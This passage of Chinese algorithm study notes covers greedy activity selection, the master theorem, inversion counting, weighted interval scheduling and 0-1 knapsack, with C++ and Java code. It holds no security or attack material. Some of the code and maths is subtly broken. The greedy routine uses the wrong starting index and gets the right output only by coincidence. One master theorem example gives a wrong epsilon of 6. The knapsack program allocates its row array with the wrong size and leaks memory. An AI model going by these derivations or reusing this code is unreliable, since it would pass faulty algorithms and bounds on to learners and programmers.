③每次选择**结束时间最早**的活动\n\n依次证明上面哪种思路可以应用于本题，为了方便，我们用不同颜色的线条代表每个活动，线条的长度就是活动所占据的时间段，蓝色的线条表示我们已经选择的活动；红色的线条表示我们没有选择的活动。\n\n**①**每次选择**开始时间最早**的活动（`不是最优解`）\n\n![](https://img.jwt1399.top/img/WWEMNdAZPFyV9CATDQaG.png)\n\n- 证明（反证法）：\n  - 先来看开始最早，很容易找到反例，如图贪开始最早，那么选择蓝色的活动，显然不是最优解，因为选择红色的活动，可以参加2次，而蓝色活动只能参加一次\n  - 例如我们选择了10号活动（开始时间2点，结束时间13点）；2号活动待选择（开始时间3点，结束时间5点）；\n    则会出现上图所示的情况，这显然违背了约束条件。\n\n**②**每次选择**持续时间最短**的活动（`不是最优解`）\n\n![](https://img.jwt1399.top/img/dMryDIJiFbVKQR0HXw3M.png)\n\n- 证明（反证法）：\n  - 贪持续时间最短，显然也不对，特殊情况发生在最短时间的活动，位置刚好和其他活动冲突，如果选择时间最短的活动，也不是最优解。\n  - 例如我们选择了2号活动（开始时间3点，结束时间5点）；1号活动待选择（开始时间1点，结束时间4点）；\n    则会出现上图所示的情况，这显然也违背了约束条件。\n\n**③**每次选择**结束时间最早**的活动（`最优解`）\n\n要证明一个算法是错的非常简单，要证明是对的却非常难。对于贪心算法的证明，一是使用归纳法，二是采用反证法。像上面两种策略，我们实际上就用到了反证法。那么怎么证明贪心算法是对的呢？\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"🔔请输入文章查看码，看更多内容\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n**3、计算最优解**\n\n`求解思路：`将活动按照结束时间进行从小到大排序。挑选出结束时间尽量早的活动，并且满足后一个活动的起始时间晚于前一个活动的结束时间，全部找出这些活动就是最大的相容活动子集合。首先检查活动 i 是否与当前已选择的所有活动相容。若相容，活动 i 加入已选择活动的集合中，否则不选择活动 i，而继续检查下一活动与集合中活动的相容性。若活动 i 与之相容，则 i 成为最近加入集合 的活动，并取代活动 j 的位置。\n\n图中每行相应于算法的一次迭代。阴影长条表示的活动是已选入集合A的活动，而空白长条表示的活动是当前正在检查相容性的活动。\n\n![](https://img.jwt1399.top/img/image-20211126114040642.png)\n\n**因此最大的相容活动子集合为{1,4,8,11}**\n\n#### ➁代码实现\n\n```c\n#include <iostream>\nusing namespace std;\n\nvoid GreedyChoose(int len,int *s,int *f,bool *flag) {\n  flag[0] = true;\n  int j = 1;\n  for(int i=2;i<len;++i)\n    if (s[i] >= f[j]) {\n      flag[i] = true;\n      j = i;\n    }\n    else flag[i] = false;\n}\n\nint main(int argc, char* argv[]) {\n  int s[11] ={1,3,0,5,3,5,6,8,8,2,12};\n  int f[11] ={4,5,6,7,8,9,10,11,12,13,14};\n\n  bool mark[11] = {0};\n\n  GreedyChoose(11,s,f,mark);\n  for(int i=0;i<11;i++)\n    if (mark[i])\n      cout<<i+1<<\" \";\n  //system(\"pause\");\n  return 0;\n}\n```\n\n****\n\n~~其他经典贪心算法如下，等有空了再详细写吧！~~\n\n~~找零钱的问题、单源最短路径中的Dijkstra算法、最小生成树的Prim算法、最小生成树的Kruskal算法、Huffman编码~~\n\n### ❹真题练习\n\n#### LC5.分发饼干\n\n**题目**\n\n假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。\n\n对每个孩子 i，都有一个胃口值 g[i]，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 j，都有一个尺寸 s[j] 。如果 s[j] >= g[i]，我们可以将这个饼干 j 分配给孩子 i ，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。\n\n\n示例 1:\n\n```properties\n输入: g = [1,2,3], s = [1,1]\n输出: 1\n解释: \n你有三个孩子和两块小饼干，3个孩子的胃口值分别是：1,2,3。\n虽然你有两块小饼干，由于他们的尺寸都是1，你只能让胃口值是1的孩子满足。\n所以你应该输出1。\n```\n\n示例 2:\n\n```properties\n输入: g = [1,2], s = [1,2,3]\n输出: 2\n解释: \n你有两个孩子和三块小饼干，2个孩子的胃口值分别是1,2。\n你拥有的饼干数量和尺寸都足以让所有孩子满足。\n所以你应该输出2.\t\n```\n\n\n提示：\n\n- 1 <= g.length <= 3 * 104\n- 0 <= s.length <= 3 * 104\n- 1 <= g[i], s[j] <= 231 - 1\n\n**思路**\n\n为了了满足更多的小孩，就不要造成饼干尺寸的浪费。\n\n**这里的局部最优就是小饼干喂给胃口小的或者大饼干喂给胃口大的，充分利用饼干尺寸喂饱小孩，全局最优就是喂饱尽可能多的小孩**。\n\n可以尝试使用贪心策略，先将饼干数组和小孩数组排序。\n\n然后从前向后或者从后向前遍历小孩数组，用小饼干满足胃口小的或者大饼干优先满足胃口大的，并统计满足小孩数量。\n\n**解答**\n\n```java\n// 优先考虑饼干，小饼干先喂饱小胃口\nclass Solution {\n    public int findContentChildren(int[] g, int[] s) {\n        Arrays.sort(g);\n        Arrays.sort(s);\n        int count = 0;\n        for(int i = 0, j = 0; i < g.length && j < s.length; j++){\n            if(g[i] <= s[j]){\n                count++;\n                i++;\n            }\n        }\n        return count;\n    }\n}\n```\n\n```java\n// 优先考虑胃口，先喂饱大胃口\nclass Solution {\n    public int findContentChildren(int[] g, int[] s) {\n        Arrays.sort(g);\n        Arrays.sort(s);\n        int count = 0;\n        int j = s.length - 1;\n        // 遍历胃口\n        for (int i = g.length - 1; i >= 0; i--) {\n            if(j >= 0 && g[i] <= s[j]) {\n                count++;\n                j--;\n            }\n        }\n        return count;\n    }\n}\n```\n\n## ④分治算法\n\n> **本章重点：**\n>\n> - 理解分治算法的思想；\n> - 掌握Counting inversions问题的分治算法；\n> - 能用Master Theorem求解递归关系式\n\n### ❶算法分析\n\n分治算法的核心是**分而治之**，就是把一个复杂的问题**分成**多个相同/相似的子问题，递归地解决这些子问题然后进行**合并**，原问题的解即子问题解的合并。\n\n**分治法适用的情况**\n\n- 问题的规模缩小到一定的程度就可以容易地解决；\n- 问题可以分解为若干个规模较小的相同问题，即该问题具有最优子结构性质；\n- 问题分解出的子问题的解可以合并为问题的解；\n- 问题所分解出的各个子问题是相互独立的，即子问题之间不包含公共的子子问题。\n\n**解题步骤**\n\n- 1.分解：将原问题分解为若干规模较小，相互独立，与原问题相同的子问题。\n- 2.解决：若干子问题较小而容易被解决则直接解决，否则再继续分解为更小的子问题，直到容易解决。\n- 3.合并：将已求解的各个子问题的解，逐步合并为原问题的解。\n\n### ❷主定理\n\n主定理适用于求解右边递归式算法的时间复杂度：**T(n) = aT(n/b) + f(n)**\n\n其中：\n\n- n：问题的规模大小\n- a：原问题的子问题个数\n- n/b：每个子问题的大小\n- f(n)：将原问题分解成子问题和将子问题的解合并成原问题的解的时间。\n\n**定理：**设 a >= 1，b >=1 为常数，设 f(n) 为一函数，T(n) 由以下递归式给出 T(n) = aT(n/b) + f(n)，则T(n)可能有如下渐近界：\n\n- ①若 f(n) < n<sup>log<sub>b</sub>a</sup> 时，存在 ε > 0，有 f(n) = O(n<sup>log<sub>b</sub>a-ε</sup>)，则 **T(n) = Θ(n<sup>log<sub>b</sub>a</sup>)**\n\n- ②若 f(n) = n<sup>log<sub>b</sub>a</sup> 时，有 f(n) = Θ(n<sup>log<sub>b</sub>a</sup>)，则 **T(n) = Θ(n<sup>log<sub>b</sub>a</sup>logn)**\n- ③若 f(n) > n<sup>log<sub>b</sub>a</sup> 时，存在 ε > 0，有 f(n) = Ω(n<sup>log<sub>b</sub>a+ε</sup>)，且满足 af(n/b) ≤ cf(n), c<1，则 **T(n) = Θ(f(n))**\n\n**来几道例题，利用主定理求渐近表达式：**\n\n例一：求解递推方程 T(n) = 9T(n/3) + n\n\n​\ta = 9，b = 3 ，f(n) = n，n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>3</sub>9</sup> = n<sup>2</sup> > f(n)\n\n   存在 f(n) = O(n<sup>log<sub>b</sub>a-ε</sup>) = O(n<sup>log<sub>3</sub>9-6</sup>)，ε = 6\n\n​\t满足主定理的条件1，因此 T(n) = Θ(n<sup>log<sub>b</sub>a</sup>) = Θ(n<sup>2</sup>)\n\n 例二：求解递推方程 T(n) = T(2n/3) + 1\n\n​\ta = 1，b = 3/2，f(n)=1，n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>3/2</sub>1</sup> =  n<sup>0</sup> = 1 = f(n)\n\n​\t满足主定理的条件2，所以T(n) = Θ(n<sup>log<sub>b</sub>a</sup>logn) = Θ(logn)\n\n 例三：求解递推方程 T(n) = 3T(n/4) + nlogn\n\n​\ta = 3，b = 4，f(n) = nlogn，n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>4</sub>3 </sup>< f(n)\n\n​\t再判断是否满足不等式：af(n/b) ≤ cf(n)，代入f(n) = nlogn\n\n​\t(3n/4)log(n/4)和cnlogn，当 c ≥ 3/4 即可满足 af(n/b) ≤ cf(n) 的关系\n\n​\t即满足主定理的条件3，所以T(n) = Θ(f(n)) = Θ(nlogn)\n\n### ❸计数逆序\n\n> **问题描述：**设 S 为一个有 n 个数字的有序集 ( n > 1 )，其中所有数字各不相同。如果存在正整数 i , j 使得 1 ≤ i < j ≤ n 并且 S [ i ] > S [ j ] ，则 （S [ i ] , S [ j ] ） 这个有序对称为 S 的一个逆序对，也称作逆序数。\n\n分解：将 S 分为 A 和 B 两部分。\n\n解决：递归计算A 、B、AB中的逆序数。\n\n合并：返回三个计数的总和。\n\n![](https://img.jwt1399.top/img/202111242033582.png)\n\n### ❹真题练习\n\n#### ➀题目1\n\n![](https://img.jwt1399.top//img/20211017212545.png)\n\n(1) f(n) = 9f(n/6) + Θ(nlogn)\n\na = 9 ， b = 6 ， f(n) = Θ(nlogn)， n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>6</sub>9</sup> ，Θ(nlogn) < Θ(n<sup>log<sub>6</sub>9</sup>)，\n\nf(n) < Θ( n<sup>log<sub>b</sub>a</sup>)，因此 f(n) =  Θ(n<sup>log<sub>b</sub>a</sup>) = Θ(n<sup>log<sub>6</sub>9</sup> )\n\n\n\n(2) f(n) = 2f(n-3) + Θ(n)\n\n------\n\nf(n) - 2f(n -3) = n                                         ①\n\n2f(n -3) - 2<sup>2</sup>f(n-6) = 2(n-3)                           ②\n\n2<sup>2</sup>f(n-6)- 2<sup>3</sup>f(n-9) = 2<sup>2</sup>(n-3)                          ③\n\n......\n\n2<sup>k-1</sup>f(n-3(k-1)) - 2<sup>k</sup>f(n-3k) = 2<sup>k-1</sup>(n-3(k-1))   第k项\n\n------\n\n① + ② + ③ + ... + 第k项 得：\n\nf(n) - 2<sup>k</sup>f(n-3k) = n(2<sup>0</sup>+2<sup>1</sup>+2<sup>2</sup>+...+2<sup>k-1</sup>) - 3(2+2\\*2<sup>2</sup>+3\\*2<sup>3</sup>+...+(k-1)\\*2<sup>k-1</sup>)\n\n​\t\t\t\t\t\t\t = -n*(1-2<sup>k</sup>) - 3\\*(2<sup>k</sup>(k-2)+2)\n\n​\t\t\t\t\t\t\t= (2<sup>k</sup>-1)\\*n -3*2<sup>k</sup>(k-2) - 6\n\n**⇒** f(n) =  (2<sup>k</sup>-1)\\*n  -3*2<sup>k</sup>(k-2) - 6 + 2<sup>k</sup>f(n-3k) \n\n令 k = n/3 则：**⇒** f(n) = n\\*2<sup>n/3</sup> - n - n\\*2<sup>n/3</sup>  + 6\\*2<sup>n/3</sup> - 6 + 2<sup>n/3</sup>\n\n**⇒** f(n) = 7\\*2<sup>n/3</sup> - n - 6 \n\n因此 f(n) =Θ(2<sup>n/3</sup>)\n\n\n\n\n\n(3) f(n) = 4f(n/2) + Θ(n<sup>2</sup>)\n\na = 4 ，b = 2 ，f(n) = Θ(n<sup>2</sup>)，n<sup>log<sub>b</sub>a</sup> = n<sup>log<sub>2</sub>4</sup>  = 2 \n\nf(n) = Θ( n<sup>log<sub>b</sub>a</sup> )，因此 f(n) = Θ(n<sup>log<sub>b</sub>a</sup>logn) = Θ(n<sup>2</sup>logn)\n\n#### ➁题目2\n\n一个数的序列中排在前面的数比排在后面的数要大的话则称为一对逆序。问下面这个序列中存在多少对逆序：5，10，7，9，13，1，8，4，12，2，6，3，11，14。（4分）\n\n答：4+8+5+6+8+0+4+2+4+0+1+0+0=42\n\n## ⑤动态规划\n\n> **本章重点：**\n>\n> - 理解动态规划算法的思想。\n> - 对相应问题能建立基本的递归关系式并用从底至上的方法来求解，在求解过程中知道如何建立数据储存的表格。\n> - 重点掌握的问题：带权重的活动安排问题、0-1背包问题、最长公共子序列问题、矩阵连乘的最优计算次序问题。\n> - 理解0-1背包问题的动态规划算法不是多项式时间算法。\n\n### ❶算法分析\n\n动态规划问题分析是自顶而下的思路，但是算法实现却是自底而上的策略。\n\n动态规划与分治法类似，都是把大问题拆分成小问题，通过寻找大问题与小问题的递推关系，解决一个个小问题，最终达到解决原问题的效果。\n\n但不同的是，分治法在子问题和子子问题等上被重复计算了很多次，而动态规划则具有记忆性，通过填写表把所有已经解决的子问题答案纪录下来，在新问题里需要用到的子问题可以直接提取，避免了重复计算，从而节约了时间，所以在问题满足最优性原理之后，用动态规划解决问题的核心就在于填表，表填写完毕，最优解也就找到。\n\n### ❷带权区间调度\n\n>**问题描述：**给定若干个工作 job 的开始时间 **s<sub>j</sub>**、结束时间 **f<sub>j</sub>** 和权重 **v<sub>j</sub>**（可以理解成重要程度），求出能完成的最大的工作权重（尽可能地完成更重要的工作），且必须满足各个**工作相容**(**工作安排的时间没有重叠**)。\n>\n>例如有如下三个工作：\n>\n>| job   | s    | f    | v    |\n>| ----- | ---- | ---- | ---- |\n>| 工作1 | 0    | 3    | 4    |\n>| 工作2 | 5    | 6    | 5    |\n>| 工作3 | 2    | 8    | 10   |\n>\n>由不带权重的区间调度方法(贪心)，按**最早结束时间**且相容选择工作，这里就选出{工作1, 工作2}，能实现的最大权重是4+5=9。但是，选择{工作3}权重可达到10，因此**最早结束时间的贪心策略在带权区间调度问题里已不适用**。那么如何求相互兼容工作的最大权值子集呢？\n\n#### ➀理论分析\n\n**1、分析最优子结构**\n\n- 工作 job 按照完成时间升序排列：f<sub>1</sub>≤f<sub>2</sub>≤…≤ f<sub>n</sub>\n- 定义两个参数：`p(j)`、`OPT(j)`\n\n`p(j)` = 与工作 j 相容的最大的工作 i 且 i < j，也就是说 i 是 j 左边的在 j 开始之前结束的区间。\n\n如下图：\n\np(1) = 0，p(2) = 0，p(3) = 0，p(4) = 1\n\np(5) = 0，p(6) = 2，p(7) = 3，p(8) = 1\n\n![](https://img.jwt1399.top//img/20211012234008.png)\n\n`OPT(j)`表示前 j 个工作 ( 1,2,3,…,j )的最大的工作权重。\n\nOPT(j) 显然有两种方案：\n\n- ①选择 j 工作\n  - 如果选择工作 j，原问题退化成 **v<sub>j</sub>+OPT(P(j))**，选择了 j 活动，则下一个活动为不能和 j 活动冲突的最大活动 P(j) \n- ②不选择 j 工作\n  - 如果不选择工作 j，原问题退化成 **OPT(j-1)**，即从(1,2,3...j-1)中找最优解\n\n**2、建立递推公式**\n\n递推公式如下：\n![](https://img.jwt1399.top//img/20211012234021.png)\n\n**3、计算`最优值`、构造`最优解`**\n\n例如：给定如下8个候选活动的开始时间、结束时间和权重\n\n![](https://img.jwt1399.top//img/20211013182102.png)\n\n依据递推公式，计算出  `p(j)`、`OPT(j)`\n\n| j      | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    |\n| ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| p(j)   | 0    | 0    | 0    | 1    | 0    | 2    | 3    | 5    |\n| OPT(j) | 12   | 20   | 23   | 25   | 26   | 40   | 40   | 42   |\n\np(8) = 5，与 活动8 相容的最大活动为 5\n\np(5) = 0，与 活动5 相容最大活动没有\n\n**因此选择活动 8 和 5**\n\nOPT(2) = max{ OPT(1) ,v<sub>2</sub> + OPT(p(2)) } = max{12,20} = 20\n\nOPT(4) = max{ OPT(3) ,v<sub>4 </sub>+ OPT(p(4)) } = v<sub>4</sub> + OPT(1) = 13 + 12 = 25\n\nOPT(7) = max{ OPT(6) ,v<sub>7</sub> + OPT(p(7)) } = max{40,34} = 40\n\nOPT(8) = max{ OPT(7) ,v<sub>8</sub> + OPT(p(8)) } = max{40,42} = 42\n\n**因此最大权重之和为42**\n\n#### ➁代码实现\n\n```c\n#include <iostream>\nusing namespace std;\n\ntypedef struct {\n\tint iStartT;\n\tint iFinshT;\n\tint iWight;\n}TASK_INFO;\n\nvoid CreatWeightedScheduling(TASK_INFO *, int);\t\t\t\t\t//创建每个任务\nvoid PrintWeightedScheduling(TASK_INFO *, int);\nvoid DynamicScheduling(TASK_INFO *, int **, int);\t\t\t\t//用动态算法求解最大权重问题\nvoid FindSolution(TASK_INFO *, int **, int, int *);\t\t\t\t//寻求最大权重任务的集合\t\n\nvoid CreatWeightedScheduling(TASK_INFO *schedule, int taskNum)\n{\n\tcout << \"请逐个输入任务的开始时间s、结束时间f、权重v\\n\";\n\tfor (unsigned int i = 0; i < taskNum; i++)\n\t{\n\t\tcout << \"Task \" << i + 1 << \" information: \";\n\t\tcin >> schedule[i].iStartT >> schedule[i].iFinshT >> schedule[i].iWight;\n\t}\n}\n\nvoid PrintWeightedScheduling(TASK_INFO *schedule, int taskNum)\n{\n\tfor (unsigned int i = 0; i < taskNum; i++)\n\t{\n\t\tcout << \"Task\" << i + 1 << \":\\t\" << schedule[i].iStartT << \"\\t\" << schedule[i].iFinshT << \"\\t\" << schedule[i].iWight << endl;\n\t}\n}\n\n/**\n** key: j号task的开始时间，即startArray[j]\n** finsh[] && currentIndex: 查找“j号task的开始时间”在j-1号之前的任务的结束时间finishArray[1...j-1]\n**/\nint binarySereach(int key, int finsh[], int currentIndex)\n{\n\tint low = 1, high = currentIndex;\n\twhile (low <= high) {\n\t\tint mid = (low + high) / 2;\n\t\tif (key == finsh[mid])\t\t\t\t\t\t\t\t\t//找到即返回Index\n\t\t\treturn mid;\n\t\telse if (key < finsh[mid]) {\t\t\t\t\t\t\t//key小于所有的finshTime，即没有一个任务相容\n\t\t\thigh = mid - 1;\n\t\t\tif (high < low)\n\t\t\t\treturn 0;\n\t\t}\n\t\telse {\t\t\t\t\t\t\t\t\t\t\t\t\t//key大于所有的finshTime，最大的相容的，即high\n\t\t\tlow = mid + 1;\n\t\t\tif (low > high)\n\t\t\t\treturn high;\n\t\t}\n\t}\n\treturn 0;\n}\n\nvoid DynamicScheduling(TASK_INFO *schedule, int **compute, int taskNum)\n{\n\tint* startArray = new int[taskNum + 1];\t\t\t\t\t\t\t\t\t\t\t\t//将每个任务的开始、结束时间转存下，方便计算P(j)\n\tint* finishArray = new int[taskNum + 1];\n\tfor (unsigned int i = 1; i < taskNum + 1; i++)\n\t{\n\t\tstartArray[i] = schedule[i - 1].iStartT;\n\t\tfinishArray[i] = schedule[i - 1].iFinshT;\n\t}\n\n\t//compute P(j) & OPT(j)\n\tfor (unsigned int j = 1; j < taskNum + 1; j++) {\n\t\t//P(j)\n\t\tcompute[0][j] = binarySereach(startArray[j], finishArray, j - 1);\n\n\t\t//OPT(j)：OPT(j) ? Wj+OPT(P(j))\n\t\tif (compute[1][j - 1] > schedule[j - 1].iWight + compute[1][compute[0][j]])\t\t\t//第一个任务信息在0号内存单元的，所以是j-1\n\t\t\tcompute[1][j] = compute[1][j - 1];\n\t\telse\n\t\t\tcompute[1][j] = schedule[j - 1].iWight + compute[1][compute[0][j]];\n\t}\n\tdelete[] startArray;\t\t\t\t\t\t//从理论上讲，new的内存必需要delete才能释放，不知道编译器有优化没？，还是显示的释放下\n\tdelete[] finishArray;\n}\n\nint g_i = 0;\nvoid FindSolution(TASK_INFO *schedule, int **compute, int j, int* path)\n{\n\tif (j == 0)\n\t\treturn;\n\telse if (schedule[j - 1].iWight + compute[1][compute[0][j]] > compute[1][j - 1])\t//后面值大于前面的，则加入；否则j-1\n\t{\n\t\tpath[g_i++] = j;\n\t\treturn FindSolution(schedule, compute, compute[0][j], path);\n\t}\n\telse\n\t\treturn FindSolution(schedule, compute, j - 1, path);\n}\n\n\nint main()\n{\n\tint taskNum = 0;\n\tcout << \"请输入你要分配总任务数： \";\n\tcin >> taskNum;\n\n\tTASK_INFO *schedule = new TASK_INFO[taskNum];\n\tCreatWeightedScheduling(schedule, taskNum);\n\n\t//用动态算法求解最大权重问题\n\t//compute[2][]:first clow means P(j); second clow means OPT(j)\n\tint **compute = new int*[taskNum + 1];\n\tfor (unsigned int i = 0; i < 2; i++)\t\t\t\t\t\t\t\t\t\t\t//分配内存及置0\n\t\tcompute[i] = new int[taskNum + 1];\n\tfor (unsigned int i = 0; i < 2; i++)\n\t\tfor (unsigned int j = 0; j < taskNum + 1; j++)\n\t\t\tcompute[i][j] = 0;\n\n\tDynamicScheduling(schedule, compute, taskNum);\n\n\tcout << \"\\n\";\n\tfor (unsigned int i = 0; i < 2; i++) {\t\t\t\t\t\t\t\t\t\t\t//输出P(j)、OPT(j)\n\t\tif (i == 0)\n\t\t\tcout << \"  P(j):  \";\n\t\telse\n\t\t\tcout << \"OPT(j):  \";\n\t\tfor (unsigned int j = 1; j < taskNum + 1; j++)\n\t\t\tcout << compute[i][j] << \"\\t\";\n\t\tcout << \"\\n\";\n\t}\n\tcout << \"\\n最大权重之和：\" << compute[1][taskNum] << endl;\n\n\t//输出任务\n\tint* path = new int[taskNum];\t\t\t\t\t\t\t\t\t\t\t\t\t//存储任务的数组\n\tfor (int i = 0; i < taskNum; ++i)\n\t\tpath[i] = 0;\n\tFindSolution(schedule, compute, taskNum, path);\n\tcout << \"最优活动子集：\";\n\tfor (unsigned int i = 0; i < taskNum && path[i] != 0; i++)\n\t\tcout << path[i] << \"  \";\n\n\tcout << \"\\n\";\n\t//PrintWeightedScheduling(schedule, taskNum);\n\n\tfor (unsigned int i = 0; i < 2; i++)\n\t{\n\t\tdelete[] compute[i];\n\t}\n\tdelete[] compute;\n\tdelete[] schedule;\n\tdelete[] path;\n}\n```\n\n![](https://img.jwt1399.top/img/image-20211013191721686.png)\n\n#### ➂真题练习\n\n##### 题目1\n\n![](https://img.jwt1399.top//img/20211013180909.png)\n\n设 `p(j)` 为与工作 j 相容的最大的工作 i 且 i < j 。`OPT(j)`表示前 j 个工作 ( 1,2,3,…,j )的最大的工作权重。则递归关系式为：\n\n![](https://img.jwt1399.top//img/20211013181235.png)\n\n依据递推公式，计算出  `p(j)`、`OPT(j)`\n\n![](https://img.jwt1399.top//img/20211013181844.png)\n\n因为 OPT(17) = 50 ，因此**最大权重之和为 50**\n\nOPT(17) = OPT(16) = OPT(15) = 50 ，选择活动 15，p(15) =13；\n\nOPT(13) = OPT(12) = 45 ，选择活动 12，p(12) = 7；\n\nOPT(7) = OPT(6) = 25 ，选择活动 6，p(6) = 3；\n\nOPT(3) = 18 ，p(3) = 0，选择活动 3，且选择完毕。\n\n因此**最优活动子集为 3、6、12、15**\n\n### ❸0-1背包问题\n\n> **问题描述：**有n个物品，它们有各自的重量 w<sub>i</sub> 和价值 v<sub>i</sub> ，现有给定容量为 C 的背包，如何让背包里装入的物品具有最大的价值总和？\n\n#### ➀理论分析\n\n**1、分析最优子结构**\n\n定义一个参数：`OPT(i,w)`\n\n`OPT(i,w)`表示表示前 i 个物品 ( 1,2,3,…,i )的最大价值，i（当前背包存放物品的数量）、w（当前背包容量）\n\nOPT(i,w) 显然有两种方案：\n\n- ①不选择 i 物品\n  - 如果不选择 i 物品，原问题退化成 **OPT(i-1，w)**，即包的剩余容量比 i 物品重量小，装不下，此时的价值与前 i-1 个的价值是一样的，从(1,2,3...i-1)中找最优解\n- ②选择 i 物品\n  - 如果选择 i 物品，原问题退化成 **v<sub>i</sub> + OPT(i-1，w-w<sub>i</sub>)**，即既然选择了 i 物品，能装的重量减少 w<sub>i</sub>，并尝试 i-1 是否装入\n\n**2、建立递推公式**\n\n递推公式如下：\n\n![](https://img.jwt1399.top/img/202111111714615.png)\n\n**3、计算`最优值`、构造`最优解`**\n\n例如：给定如下 5 个物品的价值 v<sub>i</sub> 和重量 w<sub>i</sub>，限制包的容量 C 为11\n\n![](https://img.jwt1399.top/img/202111111714596.png)\n\n依据递推公式，计算出`OPT(i,w)`\n\n![](https://img.jwt1399.top/img/202111111714543.png)\n\nOPT(2,2) = max{ v<sub>2</sub> + OPT(1,2-w<sub>2</sub>)，OPT(1,2)}  = max{6，1} = 6\n\n...\n\nOPT(3,5) = max{ v<sub>3</sub> + OPT(2,5-w<sub>3</sub>)，OPT(2,5)} =  max{18，7} = 18\n\nOPT(4,11) = max{ v<sub>4</sub> + OPT(3,11-w<sub>4</sub>)，OPT(3,11)} =  max{40，25} = 40\n\nOPT(5,11) = max{ v<sub>5</sub> + OPT(4,11-w<sub>5</sub>)，OPT(4,11)} =  max{35，40} = 40\n\n**因此最大价值为 40，由图中红线回溯可知，背包装了物品 3 和 4**\n\n#### ➁代码实现\n\n```c\n#include <iostream>\n#include <iomanip>\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//setw()函数\nusing namespace std;\n\ntypedef struct ITEM {\n\tint wight;\t\t\t\t\t\t\t\t\t\t\t\t\t//单个物品的重量\n\tint value;\t\t\t\t\t\t\t\t\t\t\t\t\t//单个物品的价值\n}ITEM_INFO;\n\nvoid creatItemInfo(ITEM_INFO *items, int itemNum)//创建背包物品基本信息\n{\n\tcout << \"请输入(value weigh),例如(1 1)\" << endl;\n\tfor (unsigned int i = 0; i < itemNum; i++)\n\t{\n\t\tcout << \"Enter item \" << i + 1 << \" information: \";\n\t\tcin >> items[i].value >> items[i].wight;\n\t}\n}\n\nvoid PrintItemInfo(ITEM_INFO *items, int itemNum)\n{\n\tfor (unsigned int i = 0; i < itemNum; i++)\n\t{\n\t\tcout << \"Item\" << i + 1 << \":\\t\" << items[i].value << \"\\t\" << items[i].wight << \"\\t\" << endl;\n\t}\n}\n\nvoid DynamicKnapsack(ITEM_INFO *items, int** m, int maxWeight, int itemNum)//用动态规划解决0/1背包问题\n{\n\t//其实首先是将m[0, ],第一行清零，由于之前全清零了，所以就没做这步了\n\n\tfor (unsigned int i = 1; i <= itemNum; i++)\t\t\t\t\t\t\t\t\t\t\t//i:物品的数量，从1到itemNum\n\t{\n\t\tfor (unsigned int w = 0; w <= maxWeight; w++)\t\t\t\t\t\t\t\t\t//w:背包的当前重量，最开始没有物品为0，慢慢增加到maxWeight\n\t\t{\n\t\t\t//分两种情况，(1)i号物品不放入背包；(2 else)i号物品放入背包\n\t\t\tif (items[i - 1].wight > w) {\n\t\t\t\tm[i][w] = m[i - 1][w];\n\t\t\t}\n\t\t\telse {\n\t\t\t\t//OPT(i,w) <== OPT(i-1, w) ? Vi+OPT(i-1, w-wi)\n\t\t\t\tif (m[i - 1][w] > items[i - 1].value + m[i - 1][w - items[i - 1].wight])\n\t\t\t\t\tm[i][w] = m[i - 1][w];\n\t\t\t\telse\n\t\t\t\t\tm[i][w] = items[i - 1].value + m[i - 1][w - items[i - 1].wight];\n\t\t\t}\n\t\t}\n\t}\n}\n\n\nint g_i = 0;\t\t\t//返回活动j存在path中\nvoid FindSolution(ITEM_INFO *items, int** m, int i, int w, int* path)//回溯求解问题的解\n{\n\tif (i == 0 || w == 0)\n\t\treturn;\n\telse if (m[i - 1][w] < items[i - 1].value + m[i - 1][w - items[i - 1].wight])\t//当w=0,不能执行这里了，重量已经0，还减少？越界，所以不加m==0判断，下面执行出错误\n\t{\n\t\t//i物品选中，迭代时候数量i减一，背包能容量的重量减wi\n\t\tpath[g_i++] = i;\n\t\treturn FindSolution(items, m, i - 1, w - items[i - 1].wight, path);\t\t\t//这里是items[i - 1]，因为第一个物品信息存放在0号内存单元的\n\t}\n\telse\n\t\t//i物品没选中，迭代时候数量i减一即可\n\t\treturn FindSolution(items, m, i - 1, w, path);\n}\n\n\nint main()\n{\n\tint itemNum = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t//物品的数量\n\tint maxWeight = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t//背包最大能放的重量\n\tcout << \"物品个数:\";\n\tcin >> itemNum;\n\tcout << \"背包容量：\";\n\tcin >> maxWeight;\n\n\tITEM_INFO *items = new ITEM_INFO[itemNum];\n\n\tcreatItemInfo(items, itemNum);\n\t//PrintItemInfo(items, itemNum);\n    \n\t//其实m[][]是(itemNum+1)*(maxWeight+1),要多一行一列\n\tint **m = new int*[maxWeight+1];\n\tfor (unsigned int i = 0; i < itemNum+1; i++)\n\t\tm[i] = new int[maxWeight + 1];\n\tfor (unsigned int i = 0; i < itemNum+1; i++)\n\t\tfor (unsigned int j = 0; j < maxWeight +1; j++)\n\t\t\tm[i][j] = 0;\n\n\tDynamicKnapsack(items, m, maxWeight, itemNum);\n\n\tcout << \"\\nm[][]:\\n\";\n\tfor (unsigned int i = 0; i <= itemNum; i++)\n\t{\n\t\tfor (unsigned int j = 0; j <= maxWeight; j++)\n\t\t\tcout << m[i][j] << setw(6);\n\t\tcout << \"\\n\";\n\t}\n\n\tint* path = new int[itemNum];\t\t\t\t\t\t\t\t\t\t\t\t\t//存储任务的数组\n\tfor (int i = 0; i < itemNum; ++i)\n\t\tpath[i] = 0;\n\n\tFindSolution(items, m, itemNum, maxWeight, path);\n\n\tcout << \"\\n最大权重物品：\";\n\tfor (unsigned int i = 0; i < itemNum && path[i] != 0; i++)\n\t\tcout << path[i] << \"  \";\n\n\t//释放内存\n\tfor (unsigned int i = 0; i < itemNum; i++)\n\t\tdelete[] m[i];\n\tdelete[] m;\n\tdelete[] items;\n\tdelete[] path;\n\treturn 0;\n}\n```\n\n![](https://img.jwt1399.top/img/202111111713603.png)\n\n\n\n#### ➂01背包是NP\n\n> 